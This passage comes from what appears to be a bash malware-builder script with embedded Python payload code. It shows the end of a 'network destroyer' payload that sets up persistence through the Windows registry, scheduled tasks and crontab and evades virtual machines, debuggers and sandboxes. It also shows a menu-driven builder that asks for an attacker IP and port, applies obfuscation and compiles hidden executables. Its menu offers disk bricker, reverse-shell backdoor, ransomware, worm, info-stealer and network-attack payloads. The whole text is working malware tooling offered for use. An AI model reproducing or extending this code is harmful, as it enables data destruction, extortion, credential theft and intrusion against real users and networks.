                winreg.SetValueEx(key, "NetworkService", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(key)
                
                # Add to scheduled tasks
                subprocess.run(
                    ['schtasks', '/create', '/tn', 'NetworkService', '/tr', sys.executable,
                     '/sc', 'onlogon', '/f'],
                    check=False
                )
            else:
                # Add to crontab
                cron_cmd = f"@reboot {sys.executable} {os.path.abspath(__file__)} > /dev/null 2>&1"
                subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True, check=False)
            
            logger.info("Persistence established")
            return True
        except Exception as e:
            logger.error(f"Error establishing persistence: {e}")
            return False
    
    def run(self):
        """Main attack execution loop"""
        try:
            # Establish persistence
            self._persistence()
            
            # Main attack loop
            while time.time() - self.start_time < ATTACK_DURATION and not self.stop_event.is_set():
                try:
                    # Scan network
                    scan_results = self._scan_network()
                    
                    if scan_results:
                        # Attack targets
                        self._attack_targets(scan_results)
                    
                    # Wait before next attack wave
                    time.sleep(60)
                    
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    logger.error(f"Error in attack loop: {e}")
                    time.sleep(30)
            
            logger.info(f"Attack execution complete. Duration: {time.time() - self.start_time:.2f} seconds")
            return True
        except Exception as e:
            logger.error(f"Error in run: {e}")
            return False

# Anti-analysis techniques
def anti_analysis():
    """Check for analysis environment"""
    try:
        # Check for virtualization
        if platform.system() == "Linux":
            vm_indicators = ['/proc/vz', '/proc/xen', '/dev/virtio-ports']
            for indicator in vm_indicators:
                if os.path.exists(indicator):
                    return False
        
        # Check for debugging
        debuggers = ['gdb', 'lldb', 'strace', 'ltrace']
        for debugger in debuggers:
            if subprocess.run(['pgrep', '-f', debugger], capture_output=True).returncode == 0:
                return False
        
        # Check for sandbox
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
            return False
        
        return True
    except:
        return True

# Main execution
if __name__ == "__main__":
    # Anti-analysis check
    if not anti_analysis():
        sys.exit(1)
    
    # Initialize and run network destroyer
    destroyer = AdvancedNetworkDestroyer()
    destroyer.run()
EOP
            ;;
        *)
            echo -e "${R}[!] Invalid payload type selected.${NC}"
            log_message "ERROR" "Invalid payload type: $type"
            return 1
            ;;
    esac
    
    echo -e "${Y}[*] Compiling to a standalone executable for $target_os...${NC}"
    
    local pyinstaller_args="--onefile --name=$final_name"
    
    # Add platform-specific arguments
    if [ "$target_os" == "Windows" ]; then
        pyinstaller_args="$pyinstaller_args --noconsole --windowed --icon=NONE"
    else
        pyinstaller_args="$pyinstaller_args --console"
    fi
    
    # Add optimization and obfuscation flags
    pyinstaller_args="$pyinstaller_args --strip --noupx --clean"
    
    # Add additional data files if needed
    if [ "$type" == "3" ]; then
        # Add wallpaper for ransomware
        pyinstaller_args="$pyinstaller_args --add-data 'wallpaper.png:.'"
    fi
    
    # Run PyInstaller with error handling
    if ! pyinstaller $pyinstaller_args payload.py; then
        echo -e "${R}[!] PyInstaller compilation failed.${NC}"
        log_message "ERROR" "PyInstaller compilation failed"
        return 1
    fi

    if [ -f "dist/$final_name" ]; then
        # Calculate file size and hash
        local file_size=$(stat -f%z "dist/$final_name" 2>/dev/null || stat -c%s "dist/$final_name")
        local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
        local file_hash=$(sha256sum "dist/$final_name" | cut -d' ' -f1)
        
        echo -e "${G}[+] Success! Malware created as 'dist/$final_name' (${size_mb} MB).${NC}"
        echo -e "${G}[+] SHA256: $file_hash${NC}"
        
        # Move to parent directory
        mv "dist/$final_name" ..
        
        # Create metadata file
        local metadata_file="../${final_name}.meta"
        cat > "$metadata_file" << EOF
Payload Type: $type
Target OS: $target_os
Build ID: $BUILD_ID
Timestamp: $BUILD_TIMESTAMP
File Size: $file_size bytes
SHA256: $file_hash
EOF
        
        log_message "SUCCESS" "Successfully created executable: $final_name (${size_mb} MB, SHA256: $file_hash)"
        return 0
    else
        echo -e "${R}[!] Failed to create executable. Check for errors above.${NC}"
        log_message "ERROR" "Failed to create executable"
        return 1
    fi
}

# Advanced configuration menu
advanced_config() {
    echo -e "\n${B}ADVANCED CONFIGURATION:${NC}"
    
    # Encryption algorithm
    echo -e "${Y}Select encryption algorithm:${NC}"
    echo "1) AES-256 (default)"
    echo "2) ChaCha20"
    echo "3) Blowfish"
    read -p ">> " enc_choice
    case $enc_choice in
        2) ENCRYPTION_ALGORITHM="ChaCha20" ;;
        3) ENCRYPTION_ALGORITHM="Blowfish" ;;
        *) ENCRYPTION_ALGORITHM="AES-256" ;;
    esac
    
    # Obfuscation level
    echo -e "\n${Y}Select obfuscation level:${NC}"
    echo "1) Low (faster)"
    echo "2) Medium (default)"
    echo "3) High (slower but more stealthy)"
    read -p ">> " obs_choice
    case $obs_choice in
        1) OBFUSCATION_LEVEL=1 ;;
        3) OBFUSCATION_LEVEL=5 ;;
        *) OBFUSCATION_LEVEL=3 ;;
    esac
    
    # Persistence method
    echo -e "\n${Y}Select persistence method:${NC}"
    echo "1) Registry (Windows)"
    echo "2) Cron (Linux)"
    echo "3) Launchd (macOS)"
    echo "4) Systemd (Linux)"
    read -p ">> " pers_choice
    case $pers_choice in
        1) PERSISTENCE_METHOD="registry" ;;
        2) PERSISTENCE_METHOD="cron" ;;
        3) PERSISTENCE_METHOD="launchd" ;;
        4) PERSISTENCE_METHOD="systemd" ;;
        *) PERSISTENCE_METHOD="registry" ;;
    esac
    
    # Enable/disable features
    read -p "Enable anti-debugging? [Y/n]: " anti_debug
    if [[ "$anti_debug" =~ ^[Nn]$ ]]; then
        ANTI_DEBUG_ENABLED=false
    fi
    
    read -p "Enable UPX packing? [Y/n]: " upx_pack
    if [[ "$upx_pack" =~ ^[Nn]$ ]]; then
        PACKER_ENABLED=false
    fi
    
    log_message "INFO" "Advanced configuration updated"
}

# Save configuration
save_config() {
    cat > "$CONFIG_FILE" << EOF
ATTACKER_IP="$ATTACKER_IP"
ATTACKER_PORT="$ATTACKER_PORT"
TARGET_OS="$TARGET_OS"
FINAL_NAME="$FINAL_NAME"
ENCRYPTION_ALGORITHM="$ENCRYPTION_ALGORITHM"
OBFUSCATION_LEVEL=$OBFUSCATION_LEVEL
PERSISTENCE_METHOD="$PERSISTENCE_METHOD"
ANTI_DEBUG_ENABLED=$ANTI_DEBUG_ENABLED
PACKER_ENABLED=$PACKER_ENABLED
EOF
    log_message "INFO" "Configuration saved to $CONFIG_FILE"
}

# Load configuration
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
        log_message "INFO" "Configuration loaded from $CONFIG_FILE"
        return 0
    fi
    return 1
}

# Main function
main() {
    # Set up trap for cleanup on exit
    trap cleanup EXIT
    
    display_banner
    check_dependencies
    
    # Try to load existing configuration
    if ! load_config; then
        echo -e "${Y}[*] No existing configuration found, using defaults${NC}"
    fi

    echo -e "${B}CONFIGURATION:${NC}"
    
    # Get attacker IP
    while true; do
        read -p "Enter attacker IP address [default: $DEFAULT_ATTACKER_IP]: " ATTACKER_IP
        ATTACKER_IP=${ATTACKER_IP:-$DEFAULT_ATTACKER_IP}
        
        if validate_ip "$ATTACKER_IP" || [ "$ATTACKER_IP" == "$DEFAULT_ATTACKER_IP" ]; then
            log_message "INFO" "Using attacker IP: $ATTACKER_IP"
            break
        else
            echo -e "${R}[!] Invalid IP address format. Please try again.${NC}"
        fi
    done

    # Get attacker port
    while true; do
        read -p "Enter attacker port [default: $DEFAULT_ATTACKER_PORT]: " ATTACKER_PORT
        ATTACKER_PORT=${ATTACKER_PORT:-$DEFAULT_ATTACKER_PORT}
        
        if validate_port "$ATTACKER_PORT" || [ "$ATTACKER_PORT" == "$DEFAULT_ATTACKER_PORT" ]; then
            log_message "INFO" "Using attacker port: $ATTACKER_PORT"
            break
        else
            echo -e "${R}[!] Invalid port number. Please enter a value between 1-65535.${NC}"
        fi
    done

    # Advanced configuration
    read -p "Configure advanced options? [y/N]: " adv_config
    if [[ "$adv_config" =~ ^[Yy]$ ]]; then
        advanced_config
    fi

    # Get target OS
    echo -e "\n${B}SELECT TARGET OPERATING SYSTEM:${NC}"
    echo "1) Windows"
    echo "2) Linux"
    while true; do
        read -p ">> " os_choice
        case $os_choice in
            1)
                TARGET_OS="Windows"
                FINAL_NAME="$FINAL_NAME_WIN"
                log_message "INFO" "Target OS selected: Windows"
                break
                ;;
            2)
                TARGET_OS="Linux"
                FINAL_NAME="$FINAL_NAME_LIN"
                log_message "INFO" "Target OS selected: Linux"
                break
                ;;
            *)
                echo -e "${R}[!] Invalid OS choice. Please enter 1 or 2.${NC}"
                ;;
        esac
    done

    # Ask if user wants to keep build files
    read -p "Keep build files for debugging? [y/N]: " KEEP_BUILD_FILES
    KEEP_BUILD_FILES=${KEEP_BUILD_FILES:-"false"}
    if [[ "$KEEP_BUILD_FILES" =~ ^[Yy]$ ]]; then
        KEEP_BUILD_FILES="true"
        log_message "INFO" "User chose to keep build files"
    else
        KEEP_BUILD_FILES="false"
        log_message "INFO" "User chose not to keep build files"
    fi

    setup_environment

    # Get payload type
    echo -e "\n${B}SELECT PAYLOAD TYPE:${NC}"
    echo "1) Bricker (Advanced Disk Destroyer)"
    echo "2) Backdoor (Advanced Reverse Shell)"
    echo "3) Ransomware (Advanced File Encryptor)"
    echo "4) Worm (Advanced Network Spreader)"
    echo "5) Info Stealer (Advanced Data Exfiltration)"
    echo "6) Network Destroyer (Advanced Network Attack)"
    while true; do
        read -p ">> " payload_choice
        if [[ "$payload_choice" =~ ^[1-6]$ ]]; then
            log_message "INFO" "Payload type selected: $payload_choice"
            break
        else
            echo -e "${R}[!] Invalid payload type. Please enter a number between 1-6.${NC}"
        fi
    done

    # Get custom filename (optional)
    read -p "Enter custom filename (leave empty for default): " CUSTOM_NAME
    if [ -n "$CUSTOM_NAME" ]; then
        # Add appropriate extension if not provided
        if [ "$TARGET_OS" == "Windows" ] && [[ ! "$CUSTOM_NAME" =~ \.exe$ ]]; then
            CUSTOM_NAME="${CUSTOM_NAME}.exe"
        fi
        FINAL_NAME="$CUSTOM_NAME"
        log_message "INFO" "Using custom filename: $FINAL_NAME"
    fi

    # Save configuration
    save_config

    echo -e "\n${R}--- GENERATING ADVANCED PAYLOAD ---${NC}"

    if generate_payload "$payload_choice" "$ATTACKER_IP" "$ATTACKER_PORT" "$TARGET_OS" "$FINAL_NAME"; then
        echo -e "${G}>> OPERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
        echo -e "${G}>> Metadata saved as '${FINAL_NAME}.meta'${NC}"
        log_message "SUCCESS" "Operation completed successfully"
    else
        echo -e "${R}>> OPERATION FAILED.${NC}"
        log_message "ERROR" "Operation failed"
    fi
}


main
